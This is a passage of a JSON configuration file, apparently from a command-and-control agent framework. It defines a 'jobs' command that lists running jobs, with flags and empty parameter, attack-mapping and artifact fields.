          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "jobs",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Retrieve a list of currently running jobs",
          "cmd": "jobs",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        }
      ]
    }
  ]
}